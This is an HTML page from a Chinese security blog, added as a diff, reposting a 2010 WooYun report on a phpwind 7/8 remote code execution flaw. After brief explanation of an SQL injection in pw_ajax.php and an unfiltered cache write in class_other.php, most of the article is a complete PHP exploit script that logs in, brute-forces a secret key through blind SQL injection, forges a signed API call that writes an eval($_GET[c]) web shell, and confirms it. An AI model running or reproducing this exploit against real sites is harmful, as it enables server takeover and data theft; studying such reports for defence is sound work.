@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        phpwind远程代码执行漏洞-2010.09 · \xeb\xfe&#39;s Blog
+        
+    </title>
+    <link rel="icon" href= /assests/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+<script>
+hljs.initHighlightingOnLoad();
+$('pre code').each(function(i, block) {
+  //hljs.highlightBlock(block);
+  var lines = $(this).text().split('\n').length - 1;
+  var $numbering = $('<ul/>').addClass('pre-numbering');
+  $(this)
+    .addClass('has-numbering')
+    .parent()
+    .append($numbering);
+  for(i=1;i<=lines;i++){
+    $numbering.append($('<li/>').text(i));
+  }
+});
+</script>
+<style>
+code.has-numbering {
+  margin-left: 10px;
+  word-wrap: normal;
+  word-break: keep-all;
+  white-space: pre;
+}
+
+.pre-numbering {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 20px;
+  height: 100%;
+  padding: .5em 0.2em .5em 0;
+  border-right: 1px solid #C3CCD0;
+  border-radius: 3px 0 0 3px;
+  background-color: #EEE;
+  text-align: right;
+  font-size: 1.0em;
+  color: #AAA;
+  list-style: none;
+}
+@media (max-width: 767px) {
+  .pre-numbering {
+    display: none;
+  }
+  .has-numbering {
+    margin-left: -10px !important;
+    word-wrap: break-world !important;
+    white-space: pre-wrap !important;
+  }
+}
+overflow-x: auto;
+overflow-y: auto;
+word-break: keep-all;
+white-space: pre;
+</style>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/styles/default.min.css">
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/highlight.min.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20171020 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >\xeb\xfe&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">phpwind远程代码执行漏洞-2010.09</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>\xeb\xfe's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            phpwind远程代码执行漏洞-2010.09
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = wooyun-1000php>wooyun-1000php</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2017/12/08</span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述"></a>简要描述</h3><p>phpwind较高版本论坛中存在一个严重的漏洞，成功利用该漏洞可以远程执行任意php代码，影响phpwind 7和phpwind 8</p>
+<h3 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h3><p>漏洞代码(pw_ajax.php)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">elseif</span> ($action == <span class="string">'pcdelimg'</span>) &#123;</span><br><span class="line">	InitGP(<span class="keyword">array</span>(<span class="string">'fieldname'</span>,<span class="string">'pctype'</span>));</span><br><span class="line">	InitGP(<span class="keyword">array</span>(<span class="string">'tid'</span>,<span class="string">'id'</span>),<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (!$tid || !$id || !$fieldname || !$pctype) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'fail'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$id = (int)$id;</span><br><span class="line">	<span class="keyword">if</span> ($pctype == <span class="string">'topic'</span>) &#123;</span><br><span class="line">		$tablename = GetTopcitable($id);</span><br><span class="line">	&#125; <span class="keyword">elseif</span> ($pctype == <span class="string">'postcate'</span>) &#123;</span><br><span class="line">		$tablename = GetPcatetable($id);</span><br><span class="line">	&#125;</span><br><span class="line">	$path = $db-&gt;get_value(<span class="string">"SELECT $fieldname FROM $tablename WHERE tid="</span>. pwEscape($tid));</span><br></pre></td></tr></table></figure></p>
+<p>$id进行了整数化，但是$fieldname未经任何有效的过滤（全局的一些其他的比较搞笑看起来不错的过滤对这里不起任何安全上的意义，只是对漏洞利用带来了一些难度），利用该注射可以获取任何数据库里的数据。</p>
+<p>另外class_other.php中存在一个任意命令执行的漏洞<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">threadscateGory</span><span class="params">($classdb)</span> </span>&#123;<span class="comment">//生成帖子交换分类</span></span><br><span class="line">        $classcache = <span class="string">"&lt;?php\r\n\$info_class=array(\r\n"</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($classdb <span class="keyword">as</span> $key =&gt; $class) &#123;</span><br><span class="line">            !$class[<span class="string">'ifshow'</span>] &amp;&amp; $class[<span class="string">'ifshow'</span>] = <span class="string">'0'</span>;</span><br><span class="line">            $flag &amp;&amp; $info_class[$class[<span class="string">'cid'</span>]][<span class="string">'ifshow'</span>] &amp;&amp; $class[<span class="string">'ifshow'</span>] = <span class="string">'1'</span>;</span><br><span class="line">            $class[<span class="string">'name'</span>] = str_replace(<span class="keyword">array</span>(<span class="string">'"'</span>,<span class="string">"'"</span>),<span class="keyword">array</span>(<span class="string">"&amp;quot;"</span>,<span class="string">"&amp;#39;"</span>),$class[<span class="string">'name'</span>]);</span><br><span class="line">            $classcache .= <span class="string">"'$class[cid]'=&gt;"</span>.pw_var_export($class).<span class="string">",\r\n\r\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $classcache .= <span class="string">");\r\n?&gt;"</span>;</span><br><span class="line">        writeover(D_P.<span class="string">"data/bbscache/info_class.php"</span>,$classcache);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>$class[cid]未经过滤，我们可以往里面直接 写精心构造的shellcode，进入此逻辑需要一些较为关键的key，借助上面的注射漏洞即可获得该key，满足全部条件之后就会生成一个info_class.php</p>
+<h3 id="漏洞证明-POC"><a href="#漏洞证明-POC" class="headerlink" title="漏洞证明(POC)"></a>漏洞证明(POC)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">" </span></span><br><span class="line"><span class="string">Info: Poc for Phpwind远程命令执行</span></span><br><span class="line"><span class="string">Test: exploit.php user password http://**.**.**.**/phpwind/</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"><span class="keyword">if</span>($argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"\r\n参数缺少\r\n"</span>;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$user=$argv[<span class="number">1</span>];</span><br><span class="line">$pass=$argv[<span class="number">2</span>];</span><br><span class="line">$pwurl=$argv[<span class="number">3</span>];</span><br><span class="line">$myheader=<span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language: zh-cn,zh;q=0.5'</span>,</span><br><span class="line">		<span class="string">'Accept-Charset: gb2312,utf-8;q=0.7,*;q=0.7'</span>,</span><br><span class="line">		<span class="string">'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">		<span class="string">'Referer: http://**.**.**.**/'</span>,</span><br><span class="line">        <span class="string">'Connection: Keep-Alive'</span>, </span><br><span class="line">        <span class="string">'Cache-Control: no-cache'</span>,</span><br><span class="line">		<span class="string">'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; InfoPath.2)'</span></span><br><span class="line">    );</span><br><span class="line">$cookie=<span class="string">""</span>;</span><br><span class="line">$str=curlsend(<span class="string">"$pwurl/login.php?"</span>,<span class="string">"POST"</span>,<span class="number">0</span>,$myheader,<span class="string">"forward=&amp;jumpurl=http%3A%2F%2F**.**.**.**%2FPHPWind/upload%2F&amp;step=2&amp;lgt=0&amp;pwuser=$user&amp;pwpwd=$pass&amp;hideid=0&amp;cktime=31536000&amp;submit=%B5%C7%C2%BC"</span>,<span class="number">1</span>);</span><br><span class="line">preg_match_all(<span class="string">"/Set-Cookie:([^;]+)/is"</span>,$str,$array);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($array[<span class="number">1</span>]);$i++)&#123;</span><br><span class="line">	$cookie=$cookie.<span class="string">";"</span>.$array[<span class="number">1</span>][$i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo $cookie;</span></span><br><span class="line">$test = curlsend(<span class="string">'$pwurl/pw_ajax.php'</span>,<span class="string">"POST"</span>,<span class="number">0</span>,$myheader,<span class="string">''</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(strpos($test,<span class="string">'&lt;ajax&gt;'</span>)) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'用户密码或者其他参数错误'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$shellcode=<span class="string">"action=pcdelimg&amp;fieldname=db_value%20from%20pw_config%20where%20db_name%20like%200x64625f736974656f776e65726964%20and%20db_value%20like%200x&#123;offset&#125;25%20union%20select%200x612e2e;%23"</span>;</span><br><span class="line">$hash=<span class="string">"0123456789abcdef"</span>;</span><br><span class="line">$craked=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">32</span>;$i++)&#123;</span><br><span class="line">	<span class="keyword">for</span>($n=<span class="number">0</span>;$n&lt;<span class="number">16</span>;$n++)&#123;</span><br><span class="line">		$tmp=str_replace(<span class="string">"&#123;offset&#125;"</span>,bin2hex($craked.$hash[$n]),$shellcode);</span><br><span class="line">		$tmp=curlsend(<span class="string">"$pwurl/pw_ajax.php"</span>,<span class="string">"POST"</span>,<span class="number">0</span>,$myheader,$tmp,<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(strpos($tmp,<span class="string">"pw_config"</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"CrackEd Offset "</span>.($i+<span class="number">1</span>).<span class="string">" :"</span>.$hash[$n].<span class="string">"\r\n"</span>;</span><br><span class="line">			$craked=$craked.$hash[$n];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Craked Magicdata :"</span>.$craked.<span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Get shell :"</span>;</span><br><span class="line"><span class="comment">//another 0day</span></span><br><span class="line">$arg=<span class="string">''</span>;</span><br><span class="line">$hack = <span class="keyword">array</span>();</span><br><span class="line">$hack[<span class="string">'mode'</span>] = <span class="string">'Other'</span>;</span><br><span class="line">$hack[<span class="string">'method'</span>] = <span class="string">'threadscateGory'</span>;</span><br><span class="line">$hack[<span class="string">'params'</span>] = <span class="string">'a:1:&#123;s:3:"cid";a:1:&#123;s:3:"cid";a:1:&#123;s:3:"cid";s:21:"\'.eval($_GET[c]).\'abc";&#125;&#125;&#125;'</span>;</span><br><span class="line">$hack[<span class="string">'type'</span>] = <span class="string">'app'</span>;</span><br><span class="line">$hack = strips($hack);</span><br><span class="line">ksort($hack);</span><br><span class="line">reset($hack);</span><br><span class="line"><span class="keyword">foreach</span> ($hack <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	<span class="keyword">if</span> ($value &amp;&amp; $key != <span class="string">'sig'</span>) &#123;</span><br><span class="line">		$arg .= <span class="string">"$key=$value&amp;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$arg.=<span class="string">'sig='</span>.md5($arg.$craked);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"$pwurl/pw_api.php?"</span>.$arg);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"OK\r\n"</span>;</span><br><span class="line">$str=file_get_contents(<span class="string">"$pwurl/data/bbscache/info_class.php?c=echo%20Just_wooyun;"</span>);</span><br><span class="line"><span class="keyword">if</span>(strpos($str,<span class="string">'wooyun'</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Got shell :"</span>.<span class="string">"$pwurl/data/bbscache/info_class.php?c=phpinfo();"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"\r\nOver!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strips</span><span class="params">($param)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array($param)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span> ($param <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			$param[$key] = strips($value);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$param = stripslashes($param);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $param;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curlsend</span><span class="params">($url,$method=false,$ssl=<span class="number">0</span>,$myheader,$data=<span class="string">''</span>,$header=<span class="number">0</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $cookie;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">$timeout = <span class="number">0</span>; <span class="comment">// set to zero for no timeout</span></span><br><span class="line">curl_setopt ($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt ($ch, CURLOPT_POST, $method);</span><br><span class="line">curl_setopt($ch,CURLOPT_HTTPHEADER,$myheader);</span><br><span class="line">curl_setopt ($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</span><br><span class="line">curl_setopt ($ch, CURLOPT_COOKIE, $cookie);</span><br><span class="line"><span class="keyword">if</span>($data)&#123;</span><br><span class="line">curl_setopt ($ch, CURLOPT_POSTFIELDS,$data);</span><br><span class="line">&#125;</span><br><span class="line">curl_setopt ($ch, CURLOPT_HEADER, $header);</span><br><span class="line"><span class="keyword">if</span>($ssl)&#123;</span><br><span class="line">	curl_setopt($ch,  CURLOPT_SSL_VERIFYPEER,  <span class="keyword">FALSE</span>);</span><br><span class="line">&#125;</span><br><span class="line">$handles = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="comment">//echo $handles;</span></span><br><span class="line"><span class="keyword">return</span> $handles;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="POC代码原理分析"><a href="#POC代码原理分析" class="headerlink" title="POC代码原理分析"></a>POC代码原理分析</h3><p>首先通过curl结合上述SQL注入漏洞得到用户user和密码password以及爆破出一些重要的key，然后开始构造shellcode往文件中写入GET一句话<code>(eval($_GET[c]))</code>，c为传入的参数，通过传入echo字符串<code>(echo Just_wooyun)</code>,然后判断页面中是否存在wooyun这个字符串来判断一句话是否写入成功，如果已经写入成功，直接把<code>c=phpinfo();</code>拼接在链接后面，打印出来</p>
+<h3 id="POC执行成功截图"><a href="#POC执行成功截图" class="headerlink" title="POC执行成功截图"></a>POC执行成功截图</h3><p><img src="1.jpg" alt=""><br><img src="2.jpg" alt=""><br>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-0417.html" target="_blank" rel="noopener">phpwind远程代码执行漏洞-2010.09</a></p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2017/12/08/wooyun-1000php-6/" title= phpcms 2008 sp4 爆路径及任意文件删除漏洞 >
+                    <span>往后一页</span>
+                    <span>phpcms 2008 sp4 爆路径及任意文件删除漏洞</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:447344932@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/doge-dog" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">Welcome, No. <span id="busuanzi_value_site_uv"></span> visitor.
+        </span>
+    </div>
+    
+
+
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简要描述"><span class="toc-number">1.</span> <span class="toc-text">简要描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#详细说明"><span class="toc-number">2.</span> <span class="toc-text">详细说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞证明-POC"><span class="toc-number">3.</span> <span class="toc-text">漏洞证明(POC)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC代码原理分析"><span class="toc-number">4.</span> <span class="toc-text">POC代码原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC执行成功截图"><span class="toc-number">5.</span> <span class="toc-text">POC执行成功截图</span></a></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>tags</span>
+
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive" >目前才写: 9 篇博文，好好努力吧，骚年。 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-6/" >phpcms 2008 sp4 爆路径及任意文件删除漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-4/" >Discuz!漫游插件API本地包含漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-5/" >PHPCMS通杀XSS-2010.08</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-3/" >ecshop SQL注射漏洞-2010.8.21</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-2/" >Discuz！7.2/X1 第三方心情墙插件SQL注入及持久型XSS漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-1/" >BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2017/11/26/hxctf2017-writeup/" >hxctf2017-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2017/11/24/blog/" >My blog</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">小试牛刀</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">wooyun-1000php</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #888; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
